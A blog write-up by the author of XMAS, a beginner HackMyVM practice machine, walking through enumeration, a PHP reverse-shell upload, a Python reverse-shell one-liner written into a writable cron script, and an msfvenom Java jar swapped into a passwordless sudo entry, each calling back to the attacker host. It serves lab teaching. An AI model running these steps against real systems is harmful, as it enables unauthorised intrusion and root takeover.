---
title: Write-up XMAS on HackMyVM
author: eMVee
date: 2023-12-28 10:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, PNPT, xmas]
render_with_liquid: false
---

Merry Christmas and a happy new year! In this writeup you can read about XMAS, a vulnerable virtual machine developed by me. This machine is designed for beginners and is also known as a boot2root machine. The machine can be downloaded from [www.hackmyvm.eu](https://www.hackmyvm.eu). In this write-up I describe how you could hack this machine. If you want to learn something, try hacking this machine yourself first and if you really can’t figure it out, you can read this writeup to learn from it.

## Getting started
Let’s import the vulnerable machine into our lab environment. The vulnerable machine is build in a Oracle VirtualBox environment, so this should work perfectly withing this lab. I’ve created a separate virtual network for vulnerable machines. The new vulnerable machine should be configured to use this virtual network as well.

Before we start hacking we should create a working directory for this machine.

```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV           

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir XMAS

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd XMAS         
```
Now we should check our own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 496sec preferred_lft 496sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:7a:2e:8c:4d brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```

## Enumeration
Ready set get, Hacking! No, we cannot start yet with hacking, we should enumerate first.
Let's identify the IP addresses on our network.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.21
```
The target is running on `10.0.2.21`, so let's assign it to a variable
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ ip=10.0.2.21
```
No we can use the variable in our commands.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-21 08:04 CET
Nmap scan report for 10.0.2.21
Host is up (0.00039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a6:3e:0b:65:85:2c:0c:5e:47:14:a9:dd:aa:d4:8c:60 (ECDSA)
|_  256 99:72:b5:6e:1a:9e:70:b3:24:e0:59:98:a4:f9:d1:25 (ED25519)
80/tcp open  http    Apache httpd 2.4.55
|_http-title: Did not follow redirect to http://christmas.hmv
|_http-server-header: Apache/2.4.55 (Ubuntu)
MAC Address: 08:00:27:B1:AE:10 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms 10.0.2.21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.47 seconds
```
We should take some notes on the results.
- Linux, probably Ubuntu
- Port 22
	- SSH
	- OpenSSH 9.0p1 Ubuntu 1ubuntu8.5
- Port 80
	- HTTP
	- Apache 2.4.55
	- Redirect to http://christmas.hmv

Let's add this domain name to our `/etc/hosts` file.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ sudo nano /etc/hosts               

┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ cat /etc/hosts   
127.0.0.1       localhost
127.0.1.1       kali
10.0.2.21 christmas.hmv

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
No we can use the domain name to enumerate the website. One of the tools we can use is whatweb.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ whatweb http://christmas.hmv
http://christmas.hmv [200 OK] Apache[2.4.55], Bootstrap, Country[RESERVED][ZZ], Email[info@christmas.hmv,santa@christmas.hmv], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.55 (Ubuntu)], IP[10.0.2.21], JQuery, Meta-Author[Alabaster Snowball], Script[text/javascript], Title[Merry Christmas], X-UA-Compatible[IE=edge]

```
Whatweb discovered a few things we should add to our notes:
- Email
	- santa@christmas.hmv
	- info@christmas.hmv
- Alabaster Snowball
- Title: Merry Christmas

Nikto is a tool that could scan websites for known vulnerabilities. Let's find out if something can be found.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ nikto -h http://christmas.hmv
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.21
+ Target Hostname:    christmas.hmv
+ Target Port:        80
+ Start Time:         2023-11-21 08:25:13 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.55 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /php/: Directory indexing found.
+ /php/: This might be interesting.
+ /images/: Directory indexing found.
+ 7962 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-11-21 08:25:47 (GMT1) (34 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
There are some directories found with  indexing. This means we can browse those directories and see the content of those directories. We should enumerate directories and files on this website. We can use dirsearch to discover files and directories.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ dirsearch -u http://christmas.hmv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html,php,txt

  _|. _ _  _  _  _ _|_    v0.4.2                           
 (_||| _) (/_(_|| (_| )     
                                                             
Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/christmas.hmv/_23-11-21_08-26-46.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-11-21_08-26-46.log

Target: http://christmas.hmv/

[08:26:46] Starting: 
[08:26:47] 301 -  316B  - /uploads  ->  http://christmas.hmv/uploads/      
[08:26:47] 301 -  312B  - /php  ->  http://christmas.hmv/php/              
[08:26:48] 301 -  312B  - /css  ->  http://christmas.hmv/css/              
[08:26:49] 301 -  311B  - /js  ->  http://christmas.hmv/js/                
[08:26:49] 301 -  319B  - /javascript  ->  http://christmas.hmv/javascript/
[08:26:50] 301 -  315B  - /images  ->  http://christmas.hmv/images/        
[08:26:53] 301 -  314B  - /fonts  ->  http://christmas.hmv/fonts/          
[08:32:44] 403 -  278B  - /server-status                                    
                                                                              
Task Completed   
```

While dirsearch was enumerating directories and files we could see an interesting directory names: `uploads` in the results. This might be interesting to us if we can upload some shell.

![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121083909.png){: width="700" height="400" }

The directory has indexing so we could see anything in here, but for now it is empty.
Let's visit the website in the browser.

![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121083110.png){: width="700" height="400" }

It is counting down to Christmas. We should enumerate the website further.

![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121083412.png){: width="700" height="400" }

There is a nice and naughty list. The text indicates that a database is used for this and that something is automated to fill the lists. Let's continue with enumerating.
![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121083434.png){: width="700" height="400" }

There is an upload function to upload you wish list. It should be a format as described. We will check that at another moment. First we should continue with enumerating the website.
![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121083455.png){: width="700" height="400" }

Offcourse Santa does have helpers, we should enumerate them and add to the notes.
- Sugarplum Mary

![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121083516.png){: width="700" height="400" }

It confirms that `Alabaster Snowball` is someone helping Santa.
- Alabaster Snowball

The website has an upload function what could be vulnerable for our attack. We can try to upload a PHP webshell and create a reverse shell. First we have to copy the webshell to our working directory.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
```

Then we need to adjust the IP address (and you could change the port) and save the changes.

![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121084755.png){: width="700" height="400" }

After saving we should upload our webshell.

![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121092524.png){: width="700" height="400" }

After uploading we should start a netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...

```
We should refresh the `uploads` directory to see if the webshell is uploaded.

![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121092702.png){: width="700" height="400" }

The webshell is shown, to activate the reverse shell we should click on `shell.php` to create a connection back to our listener.

## Initial access
Now we should check our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.21] 40060
Linux xmas 6.2.0-36-generic #37-Ubuntu SMP PREEMPT_DYNAMIC Wed Oct  4 10:14:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 08:34:54 up  1:38,  0 user,  load average: 0.04, 0.09, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 


```
It looks like a connection has been established. Now we should upgrade the shell a bit.
```bash
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
$ export TERM=xterm-256color  
$ alias ll='ls -lsaht --color=auto'  
```
Now hit `CTRL+Z` on the keyboard to move it to the background
```bash
$ 
zsh: suspended  rlwrap nc -lvnp 1234
```
As soon as it is suspended we should continue upgrading the shell.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ stty raw -echo ; fg ; reset  
[1]  + continued  rlwrap nc -lvnp 1234
$ stty columns 200 rows 200
stty: 'standard input': Inappropriate ioctl for device
$ python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'
www-data@xmas:/$ 


```
Let's enumerate the users on the system.
```bash
www-data@xmas:/$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
alabaster
santa
sugurplum
bushy
pepper
shinny
wunorse
www-data@xmas:/$ 

```
Let's add the users into our notes, net thing is to check the Linux distro and kernel.
```bash
www-data@xmas:/$ cat /proc/version
cat /proc/version
Linux version 6.2.0-36-generic (buildd@lcy02-amd64-047) (x86_64-linux-gnu-gcc-12 (Ubuntu 12.3.0-1ubuntu1~23.04) 12.3.0, GNU ld (GNU Binutils for Ubuntu) 2.40) #37-Ubuntu SMP PREEMPT_DYNAMIC Wed Oct  4 10:14:28 UTC 2023
www-data@xmas:/$ 

```
It is running on a `x86_64` architecture and the kernel is `6.2.0-36-generic`. The Linux distro is `Ubuntu 23.04`, this information should be added to our notes.

Let's use linpeas to enumerate a lot of information to see how we can escalate our privileges.
First we should copy linpeas to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ locate linpeas
/opt/linpeas
/opt/linpeas/linpeas.sh
/opt/linpeas/linpeas_darwin_amd64
/opt/linpeas/linpeas_darwin_arm64
/opt/linpeas/linpeas_fat.sh
/opt/linpeas/linpeas_linux_386
/opt/linpeas/linpeas_linux_amd64
/opt/linpeas/linpeas_linux_arm
/usr/bin/linpeas
/usr/share/peass/linpeas
/usr/share/peass/linpeas/linpeas.sh
/usr/share/peass/linpeas/linpeas_darwin_amd64
/usr/share/peass/linpeas/linpeas_darwin_arm64
/usr/share/peass/linpeas/linpeas_fat.sh
/usr/share/peass/linpeas/linpeas_linux_386
/usr/share/peass/linpeas/linpeas_linux_amd64
/usr/share/peass/linpeas/linpeas_linux_arm
/usr/share/peass/linpeas/linpeas_linux_arm64

┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ cp /usr/share/peass/linpeas/linpeas.sh .
```
Next we can host a simple Python webserver so we can share linpeas.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ sudo python3 -m http.server 80
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


```
Now we have to download linpeas on our victim machine and assign the executable rights.
```bash
www-data@xmas:/$ cd /tmcd /tmp
cd /tmp
www-data@xmas:/tmp$ wget hwget http://10.0.2.15/linpeas.sh
wget http://10.0.2.15/linpeas.sh
--2023-11-21 08:57:25--  http://10.0.2.15/linpeas.sh
Connecting to 10.0.2.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 836755 (817K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 817.14K  --.-KB/s    in 0.004s  

2023-11-21 08:57:25 (227 MB/s) - ‘linpeas.sh’ saved [836755/836755]

www-data@xmas:/tmp$ chmod chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@xmas:/tmp$ 

```
Let's run linpeas!
```bash
www-data@xmas:/tmp$ ./linp./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @hacktricks_live                          |                                                                                                                                                   
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username
```
Linpeas did collect a lot of information. While scrolling through all information we did notice some public writeable files.

```bash

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
/dev/mqueue
/dev/shm
/opt/NiceOrNaughty/nice_or_naughty.py
/run/apache2/socks
/run/lock
/run/lock/apache2
/run/screen
/snap/core22/607/run/lock
/snap/core22/607/tmp
/snap/core22/607/var/tmp
/snap/core22/864/run/lock
/snap/core22/864/tmp
/snap/core22/864/var/tmp
/tmp
/tmp/linpeas.sh
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/christmas.hmv/uploads
```

In the writeable file this looks interesting: `/opt/NiceOrNaughty/nice_or_naughty.py`.
Let's find out if this is true.
```bash
www-data@xmas:/tmp$ cd /op
cd /opt
www-data@xmas:/opt$ ls    ls
ls
NiceOrNaughty
www-data@xmas:/opt$ cd NiceOrNaughty
cd NiceOrNaughty
www-data@xmas:/opt/NiceOrNaughty$ ls -la
ls -la
total 12
drwxr-xr-x 2 root root 4096 Nov 20 18:39 .
drwxr-xr-x 3 root root 4096 Nov 20 18:39 ..
-rwxrwxrw- 1 root root 2029 Nov 20 18:39 nice_or_naughty.py
www-data@xmas:/opt/NiceOrNaughty$ 

```
We are able to adjust the file, but first we should check what this script will do if it is executed.
```bash
www-data@xmas:/opt/NiceOrNaughty$ cat nice_or_naughty.py
cat nice_or_naughty.py
```

![image](/assets/img/WriteUp/HackMyVM/XMAS/Pasted image 20231121101041.png){: width="700" height="400" }

In this script we can see credentials for the database. The script inserts data into the table `christmas` with a name and a status nice or naughty. As mentioned on the website, this process is automated and should run every once in a time. If we can adjust this script, we can create a reverse shell. We can use the command below to perform this.
```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' > nice_or_naughty.py
```
Before changing the content of the script we should start a netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...

```
Now we can change the python script by entering our code.
```bash
www-data@xmas:/opt/NiceOrNaughty$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' > nice_or_naughty.py
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' > nice_or_naughty.py
www-data@xmas:/opt/NiceOrNaughty$ 

```
We should check our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.21] 58760
$ 

```
A connection has been established, now we should upgrade our shell again.
```bash
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
$ export TERM=xterm-256color  
export TERM=xterm-256color  
$ alias ll='ls -lsaht --color=auto'  
alias ll='ls -lsaht --color=auto'
```
Now hit `CTRL+Z` on the keyboard to move it to the background.
```
$ 
zsh: suspended  rlwrap nc -lvnp 4444
```
Now we have to perform some last steps to get a good interactive shell
```
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ stty raw -echo ; fg ; reset  
[1]  + continued  rlwrap nc -lvnp 4444
$ stty columns 200 rows 200
stty columns 200 rows 200
$ python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'
python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'
alabaster@xmas:~$ 


```
Let's find out what files are in his directory.
```bash
alabaster@xmas:~$ ls -la
ls -la
total 60
drwxr-x--- 7 alabaster alabaster 4096 Nov 20 18:43 .
drwxr-xr-x 9 root      root      4096 Nov 19 22:29 ..
-rw------- 1 alabaster alabaster  791 Nov 20 19:28 .bash_history
-rw-r--r-- 1 alabaster alabaster  220 Jan  7  2023 .bash_logout
-rw-r--r-- 1 alabaster alabaster 3771 Jan  7  2023 .bashrc
drwx------ 3 alabaster alabaster 4096 Nov 19 11:07 .cache
drwxrwxr-x 4 alabaster alabaster 4096 Nov 19 11:08 .local
-rw-rw-r-- 1 alabaster alabaster   38 Nov 21 09:12 naughty_list.txt
-rw-rw-r-- 1 alabaster alabaster   25 Nov 21 09:12 nice_list.txt
drwxrwxr-x 2 alabaster alabaster 4096 Nov 19 21:50 NiceOrNaughty
-rw-r--r-- 1 alabaster alabaster  807 Jan  7  2023 .profile
drwxrwxr-x 2 alabaster alabaster 4096 Nov 20 18:45 PublishList
-rw-rw-r-- 1 alabaster alabaster   66 Nov 19 21:43 .selected_editor
drwx------ 2 alabaster alabaster 4096 Nov 17 17:32 .ssh
-rw-r--r-- 1 alabaster alabaster    0 Nov 17 17:34 .sudo_as_admin_successful
-rw-rw---- 1 alabaster alabaster  849 Nov 19 09:08 user.txt

```
There is an user flag in this directory. Let's capture the user flag.
```bash
alabaster@xmas:~$ cat user.txt
cat user.txt
    ||::|:||   .--------,
    |:||:|:|   |_______ /        .-.
    ||::|:|| ."`  ___  `".    {\('v')/}
    \\\/\///:  .'`   `'.  ;____`(   )'___________________________
     \====/ './  o   o  \|~     ^" "^                          //
      \\//   |   ())) .  |   Merry Christmas!                   \
       ||     \ `.__.'  /|                                     //
       ||   _{``-.___.-'\|   Flag: HMV{HERE_IS_THE_FLAG    }    \
       || _." `-.____.-'`|    ___                              //
       ||`        __ \   |___/   \______________________________\
     ."||        (__) \    \|     /
    /   `\/       __   vvvvv'\___/
    |     |      (__)        |
     \___/\                 /
       ||  |     .___.     |
       ||  |       |       |
       ||.-'       |       '-.
       ||          |          )
       ||----------'---------'
alabaster@xmas:~$ 

```

## Privilege escalation
We are the user `alabaster` in this shell, we should check what sudo permission we have.
```bash
alabaster@xmas:~$ sudo -l
sudo -l
Matching Defaults entries for alabaster on xmas:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User alabaster may run the following commands on xmas:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
alabaster@xmas:~$ 

```
It looks like we can run `sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar` without the need of a password. For the other one we need a password. If we can change this file to our file we are able to run a reverse shell as root. First we should know what is executed if we execute this. We can give it a try.
```bash
alabaster@xmas:~$ sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
<va -jar /home/alabaster/PublishList/PublishList.jar
Files copied successfully!
alabaster@xmas:~$ 

```
There are files copied to somewhere. Let's check the files within the `PublishList` directory.
```bash
alabaster@xmas:~$ cd PublishList
cd PublishList
alabaster@xmas:~/PublishList$ ls -la
ls -la
total 28
drwxrwxr-x 2 alabaster alabaster 4096 Nov 20 18:45 .
drwxr-x--- 7 alabaster alabaster 4096 Nov 20 18:43 ..
-rw-rw-r-- 1 alabaster alabaster   38 Nov 20 18:45 manifest.mf
-rw-rw-r-- 1 alabaster alabaster   24 Nov 20 18:44 MANIFEST.MF
-rw-rw-r-- 1 alabaster alabaster 1760 Nov 20 18:45 PublishList.class
-rw-rw-r-- 1 alabaster alabaster 1477 Nov 20 18:45 PublishList.jar
-rw-rw-r-- 1 alabaster alabaster 1182 Nov 20 18:44 PublishList.java
alabaster@xmas:~/PublishList$ 

```
There are multiple files including the source code of the jar file. Since we own the files we can do anything with those files. To escalate our privileges we can generate a java (jar) reverse shell with msfvenom and replace it with the current file.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4321 -f jar -o shell.jar
Payload size: 7506 bytes
Final size of jar file: 7506 bytes
Saved as: shell.jar
```
After creating the jar file, we should host the file with a Python webserver and download it at the victim.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ sudo python3 -m http.server 80
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
To get the reverse shell we should download our reverse shell(jar file )to the victim.
```bash
alabaster@xmas:~/PublishList$ wget http://10.0.2.15/shell.jar
wget http://10.0.2.15/shell.jar
--2023-11-21 09:23:32--  http://10.0.2.15/shell.jar
Connecting to 10.0.2.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7506 (7.3K) [application/java-archive]
Saving to: ‘shell.jar’

shell.jar           100%[===================>]   7.33K  --.-KB/s    in 0s      

2023-11-21 09:23:32 (176 MB/s) - ‘shell.jar’ saved [7506/7506]
```
We should rename the files so we can revert everything if it does not work as we planned.
```bash
alabaster@xmas:~/PublishList$ mv PublishList.jar PublishList.bak
mv PublishList.jar PublishList.bak
alabaster@xmas:~/PublishList$ mv shell.jar PublishList.jar
mv shell.jar PublishList.jar

```
Double check if the file names are changed and we can continue with our attack.
```bash
alabaster@xmas:~/PublishList$ ls -la
ls -la
total 36
drwxrwxr-x 2 alabaster alabaster 4096 Nov 21 09:23 .
drwxr-x--- 7 alabaster alabaster 4096 Nov 20 18:43 ..
-rw-rw-r-- 1 alabaster alabaster   38 Nov 20 18:45 manifest.mf
-rw-rw-r-- 1 alabaster alabaster   24 Nov 20 18:44 MANIFEST.MF
-rw-rw-r-- 1 alabaster alabaster 1477 Nov 20 18:45 PublishList.bak
-rw-rw-r-- 1 alabaster alabaster 1760 Nov 20 18:45 PublishList.class
-rw-rw-r-- 1 alabaster alabaster 7506 Nov 21 09:22 PublishList.jar
-rw-rw-r-- 1 alabaster alabaster 1182 Nov 20 18:44 PublishList.java

```
Start a new netcat listener on port 4321.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ rlwrap nc -lvnp 4321
listening on [any] 4321 ...

```
Now we should sudo the jar file to run our reverse shell.
```bash
alabaster@xmas:~/PublishList$ sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
<va -jar /home/alabaster/PublishList/PublishList.jar

```
If all goes well, we have a reverse shell connection active and we can now work as root on the system.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/XMAS]
└─$ rlwrap nc -lvnp 4321
listening on [any] 4321 ...
